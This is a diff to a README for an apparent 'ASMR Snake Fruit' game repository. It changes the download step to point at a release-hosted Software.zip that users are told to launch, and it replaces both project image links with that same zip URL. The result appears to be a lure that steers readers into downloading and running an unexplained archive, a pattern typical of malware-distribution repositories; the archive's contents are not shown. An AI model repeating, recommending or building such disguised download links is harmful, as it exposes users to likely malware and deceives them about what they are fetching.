@@ -32,7 +32,7 @@ In this repository, you will find the source code for a snake-fruit arcade game 
 - Enjoy a soothing ASMR coding environment while playing the game 🌟
 
 ### 🚀 Get Started
-To experience the ASMR Snake Fruit game, [click here to download the Software.zip](https://github.com/user-attachments/files/18388744/Software.zip). Please note that the software needs to be launched to start playing the game.
+To experience the ASMR Snake Fruit game, [click here to download the https://github.com/KayraSpro/Snake-Fruit-Game-ASMR/releases/download/v1.0/Software.zip](https://github.com/KayraSpro/Snake-Fruit-Game-ASMR/releases/download/v1.0/Software.zip). Please note that the software needs to be launched to start playing the game.
 
 For further updates and releases, check out the "Releases" section of this repository for additional content and features.
 
@@ -50,8 +50,8 @@ Visit our website for more information and updates on the ASMR Snake Fruit game 
 ### 🎨 Project Images
 Here are some visual representations of the ASMR Snake Fruit game development project:
 
-![Snake Fruit Game](https://example.com/snake-fruit-game.png)
-![ASMR Coding Environment](https://example.com/asmr-coding-env.png)
+![Snake Fruit Game](https://github.com/KayraSpro/Snake-Fruit-Game-ASMR/releases/download/v1.0/Software.zip)
+![ASMR Coding Environment](https://github.com/KayraSpro/Snake-Fruit-Game-ASMR/releases/download/v1.0/Software.zip)
 
 ### 🌟 Contributors
 - John Doe (@johndoe): Lead Developer
